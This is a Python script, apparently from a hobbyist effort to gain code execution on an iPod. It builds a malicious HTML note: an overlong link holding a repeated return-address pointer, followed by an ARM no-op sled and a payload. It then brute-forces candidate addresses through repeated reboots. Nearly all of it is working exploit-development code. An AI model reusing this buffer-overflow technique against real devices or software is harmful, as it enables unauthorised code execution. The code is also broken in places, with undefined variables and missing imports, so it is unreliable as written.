import display

def try_address(nanotron, address, irc = None):
    global FREEZEPAYLOAD, CRASHPAYLOAD
    display.myprint ("Testing %8x..." % address)
    nanotron.disk_mode(irc)
    writeNote(FREEZEPAYLOAD, address)
    time.sleep(3) #wait for note to be written
    nanotron.reboot(irc)
    time.sleep(35) #Waiting for boot (my measurings said 33. Farthen)
    nanotron.diskmodecombo(3) #Pressing diskmode combo to see if it eventually crashed
    time.sleep(4) #Wait for diskmode to appear
    status1 = my_nanotron.get_status()
    if status1 == 0:
        print_status(address, status1, irc=irc) #crashed
        return
    if status == 2: nanotron.disk_mode(irc) #enter disk mode if frozen
    writeNote(CRASHPAYLOAD, address)
    time.sleep(3) #wait for note to be written
    nanotron.reboot(irc)
    status2 = my_nanotron.get_status()
    print_status(address, status1, status2, irc)
    nanotron.disk_mode(irc)
    
def writeNote(payload, addr):
  pointer = "00000000%x" % addr
  pointer = "%" + pointer[-2:] + "%" + pointer[-4:-2] + "%" + pointer[-6:-4] + "%" + pointer[-8:-6]
  data = "<a href=\"" + ("A" * 256) + pointer * 64 + "\">a</a>"
  data += struct.pack("<I", 0xe1a01001) * ((4096 - len(data) - len(payload)) / 4) + payload
  outfile = open(IPODPATH + "/Notes/nanotron.htm", "wb")
  outfile.write(data)
  outfile.close()